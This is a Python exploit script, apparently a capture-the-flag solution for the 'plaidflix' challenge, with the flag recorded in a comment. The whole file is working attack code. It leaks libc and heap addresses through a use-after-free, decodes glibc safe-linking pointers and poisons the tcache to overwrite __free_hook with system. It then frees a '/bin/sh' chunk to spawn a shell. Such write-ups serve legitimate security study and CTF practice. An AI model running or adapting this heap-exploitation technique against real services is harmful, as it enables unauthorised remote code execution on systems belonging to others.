#!/usr/bin/env python3
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py

bin_file = './plaidflix'
context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

#==========

env = Environment('debug', 'local', 'remote')
env.set_item('mode',    debug = 'DEBUG', local = 'PROC', remote = 'SOCKET')
env.set_item('target',  debug   = {'argv':[bin_file], 'aslr':False, 'gdbscript':''}, \
                        local   = {'argv':[bin_file]}, \
                        # remote  = {'host':'plaidflix.pwni.ng', 'port':1337})
                        remote  = {'host':'localhost', 'port':1337})
env.set_item('libc',    debug   = None, \
                        local   = None, \
                        remote  = 'libc-2.32.so')
env.select()

#==========

binf = ELF(bin_file)

libc = ELF(env.libc) if env.libc else binf.libc
offset_libc_malloc_hook = libc.symbols['__malloc_hook']
offset_libc_mainarena   = offset_libc_malloc_hook + 0x10

#==========

def attack(conn, **kwargs):
    conn.sendlineafter('> ', 'hoge')

    pf = PlaidFlix(conn)

    for i in range(8):
        pf.add_friends(0x88-1, str(i)*4)

    pf.add_movie('AAAA', 3)
    pf.add_movie('BBBB', 3)
    pf.share_movie(0, 0)
    pf.share_movie(1, 1)

    for i in range(7, -1, -1):
        pf.remove_friends(i)

    pf.add_friends(0x90-1, 'XXXX')
    pf.remove_friends(0)
    leaks = pf.show_movie()
    pf.add_movie('CCCC', 3)

    addr_libc_mainarena = u(leaks[0]) - 0xe0
    libc.address = addr_libc_mainarena - offset_libc_mainarena
    info('addr_libc_base    = 0x{:08x}'.format(libc.address))
    addr_libc_free_hook = libc.symbols['__free_hook']
    addr_libc_system    = libc.sep_function['system']

    safe_link = u(leaks[1])
    addr_heap_base = reveal_ptr(safe_link) - 0x420
    info('addr_heap_base    = 0x{:08x}'.format(addr_heap_base))

    for i in range(8):
        pf.add_friends(0x28-1, str(i)*4)
    for i in range(8):
        pf.remove_friends(i)

    conn.sendlineafter('> ', '2')
    conn.sendlineafter('> ', 'y')

    for i in range(9):
        pf.add_feedback(str(i)*4)
    for i in range(7):
        pf.delete_feedback(i)
    for i in range(7):
        pf.add_feedback(str(i)*4)

    pf.delete_feedback(7)
    for i in range(7):
        pf.delete_feedback(i)
    pf.delete_feedback(8)

    pf.add_feedback('/bin/sh')
    pf.delete_feedback(6)

    conn.sendlineafter('> ', '2')
    conn.sendlineafter('> ', b'a'*0x38 + p64(0x101) + p64(addr_libc_free_hook ^ ((addr_heap_base+0xb80)>>12) ))

    pf.add_feedback('fuga')
    pf.add_feedback(p64(addr_libc_system))
    pf.delete_feedback(0)

class PlaidFlix:
    def __init__(self, conn):
        self.recv           = conn.recv
        self.recvuntil      = conn.recvuntil
        self.recvline       = conn.recvline
        self.unrecv         = conn.unrecv
        self.send           = conn.send
        self.sendline       = conn.sendline
        self.sendafter      = conn.sendafter
        self.sendlineafter  = conn.sendlineafter

    def add_movie(self, title, rate):
        self.sendlineafter('> ', '0')
        self.sendlineafter('> ', '0')
        self.sendlineafter('add?\n> ', title)
        self.sendlineafter('?\n> ', str(rate))

    def remove_movie(self, idx):
        self.sendlineafter('> ', '0')
        self.sendlineafter('> ', '1')
        self.sendlineafter('already.\n> ', str(idx))

    def show_movie(self):
        self.sendlineafter('> ', '0')
        self.sendlineafter('> ', '2')
        s = self.recvuntil('\nWhat')
        return re.findall(b'with: (.*)', s)

    def share_movie(self, midx, fidx):
        self.sendlineafter('> ', '0')
        self.sendlineafter('> ', '3')
        self.sendlineafter('share?\n> ', str(midx))
        self.sendlineafter('one?\n> ', str(fidx))

    def add_friends(self, size, name):
        self.sendlineafter('> ', '1')
        self.sendlineafter('> ', '0')
        self.sendlineafter('name?\n> ', str(size))
        self.sendlineafter('name?\n> ', name)

    def remove_friends(self, idx):
        self.sendlineafter('> ', '1')
        self.sendlineafter('> ', '1')
        self.sendlineafter('anymore?\n> ', str(idx))

    def add_feedback(self, fb):
        self.sendlineafter('> ', '0')
        self.sendlineafter('us?\n> ', fb)

    def delete_feedback(self, idx):
        self.sendlineafter('> ', '1')
        self.sendlineafter('delete?\n> ', str(idx))
 
#==========

def main():
    comn = Communicate(env.mode, **env.target)
    comn.connect()
    comn.run(attack)
    comn.interactive()
    # PCTF{N0w_YOu_Kn0w_S4f3_L1nk1ng!}

if __name__=='__main__':
    main()

#==========
